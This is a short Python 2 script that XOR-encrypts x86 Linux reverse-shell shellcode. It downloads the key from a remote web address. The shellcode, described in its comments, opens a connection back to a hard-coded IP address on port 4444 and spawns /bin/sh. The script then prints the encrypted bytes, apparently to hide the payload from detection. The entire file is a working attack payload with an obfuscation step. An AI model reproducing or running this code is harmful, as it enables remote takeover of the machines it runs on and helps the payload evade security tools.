import requests

original_shellcode =("\x6a\x66\x58\x31\xd2\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1"   # shellcode opens reverse connection to
"\xcd\x80\x92\x6a\x66\x58\x68\x5b\x8e\x5e\x46\x66\x68\x11\x5c\x43\x66"    # the server with IP address 91.142.94.170
"\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x87\xda\xb0\x3f\x31"
"\xc9\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x0b\x31\xd2"
"\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89"
"\xe2\x53\x89\xe1\xcd\x80")
encrypted_shellcode = ""

shellcode_length = len(original_shellcode)
print shellcode_length

r = requests.get("http://91.142.94.70/3onai7qvht7tgt9O2gr0cuf16dqxTtft5trapa7p.html")
key = str(r.text)     #now we have our key (1000 bytes long)

for i in range(0,shellcode_length):
    y = ord(original_shellcode[i]) ^ ord(key[i])   #y is a result of xoring bytes of shellcode and key
    encrypted_shellcode += '\\x%02x' %y

print encrypted_shellcode     #let's print encrypted shellcode
